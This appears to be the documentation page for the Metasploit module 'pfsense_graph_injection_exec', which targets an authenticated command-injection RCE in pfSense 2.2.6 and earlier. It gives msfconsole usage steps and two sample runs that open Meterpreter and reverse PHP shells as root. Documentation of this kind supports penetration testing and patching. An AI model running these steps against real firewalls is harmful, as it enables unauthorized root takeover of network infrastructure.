{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/http/pfsense_graph_injection_exec","result":{"data":{"moduleMetadataJson":{"id":"67c874b3-977f-512c-b69e-079e9752e1d7","name":"pfSense authenticated graph status RCE","fullname":"exploit/unix/http/pfsense_graph_injection_exec","description":"pfSense, a free BSD based open source firewall distribution,\n          version <= 2.2.6 contains a remote command execution\n          vulnerability post authentication in the _rrd_graph_img.php page.\n          The vulnerability occurs via the graph GET parameter. A non-administrative\n          authenticated attacker can inject arbitrary operating system commands\n          and execute them as the root user. Verified against 2.2.6, 2.2.5, and 2.1.3.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/http/pfsense_graph_injection_exec","documentationSlug":"/modules/documentation/exploit/unix/http/pfsense_graph_injection_exec","referencesSlug":"/modules/references/exploit/unix/http/pfsense_graph_injection_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a vulnerability in pfSense version 2.2.6 and before which allows an authenticated user to execute arbitrary operating system commands as root.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module has been tested successfully on version 2.2.6-RELEASE, 2.2.5-RELEASE, and 2.1.3-RELEASE</p>\n<p>  Installers:</p>\n<ul>\n<li><a href=\"https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.2.6-RELEASE-amd64.iso.gz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">pfSense 2.2.6-RELEASE</a></li>\n<li><a href=\"https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.2.5-RELEASE-amd64.iso.gz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">pfSense 2.2.5-RELEASE</a></li>\n<li><a href=\"https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.1.3-RELEASE-amd64.iso.gz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">pfSense 2.1.3-RELEASE</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/unix/http/pfsense_graph_injection_exec</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME [username]</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD [password]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"pfsense-community-edition-226-release\" style=\"position:relative;\"><a href=\"#pfsense-community-edition-226-release\" aria-label=\"pfsense community edition 226 release permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>pfSense Community Edition 2.2.6-RELEASE</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(unix/http/pfsense_graph_injection_exec) &gt; use exploit/unix/http/pfsense_graph_injection_execmsf exploit(unix/http/pfsense_graph_injection_exec) &gt; set RHOST 2.2.2.2\nRHOST =&gt; 2.2.2.2\nmsf exploit(unix/http/pfsense_graph_injection_exec) &gt; set LHOST 1.1.1.1\nLHOST =&gt; 1.1.1.1\nmsf exploit(unix/http/pfsense_graph_injection_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] Detected pfSense 2.2.6-RELEASE, uploading intial payload\n[*] Payload uploaded successfully, executing\n[*] Sending stage (37543 bytes) to 2.2.2.2\n[*] Meterpreter session 1 opened (1.1.1.1:4444 -&gt; 2.2.2.2:42116) at 2018-01-01 17:17:36 -0600\n\nmeterpreter &gt; sysinfo\nComputer    : pfSense.localdomain\nOS          : FreeBSD pfSense.localdomain 10.1-RELEASE-p25 FreeBSD 10.1-RELEASE-p25 #0 c39b63e(releng/10.1)-dirty: Mon Dec 21 15:20:13 CST 2015     root@pfs22-amd64-builder:/usr/obj.RELENG_2_2.amd64/usr/pfSensesrc/src.RELENG_2_2/sys/pfSense_SMP.10 amd64\nMeterpreter : php/freebsd\nmeterpreter &gt; getuid\nServer username: root (0)\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"pfsense-community-edition-213-release\" style=\"position:relative;\"><a href=\"#pfsense-community-edition-213-release\" aria-label=\"pfsense community edition 213 release permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>pfSense Community Edition 2.1.3-RELEASE</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/unix/http/pfsense_graph_injection_exec\nmsf exploit(unix/http/pfsense_graph_injection_exec) &gt; set RHOST 2.2.2.2\nRHOST =&gt; 2.2.2.2\nmsf exploit(unix/http/pfsense_graph_injection_exec) &gt; set LHOST 1.1.1.1\nLHOST =&gt; 1.1.1.1\nmsf exploit(unix/http/pfsense_graph_injection_exec) &gt; set PAYLOAD php/reverse_php\nPAYLOAD =&gt; php/reverse_php\nmsf exploit(unix/http/pfsense_graph_injection_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload\n[*] Payload uploaded successfully, executing\n[*] Command shell session 1 opened (1.1.1.1:4444 -&gt; 2.2.2.2:3454) at 2018-01-01 15:49:38 -0600\nuname -a\n\nFreeBSD pfSense.localdomain 8.3-RELEASE-p16 FreeBSD 8.3-RELEASE-p16 #0: Thu May  1 16:19:14 EDT 2014     root@pf2_1_1_amd64.pfsense.org:/usr/obj.amd64/usr/pfSensesrc/src/sys/pfSense_SMP.8  amd64</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"67c874b3-977f-512c-b69e-079e9752e1d7"}}}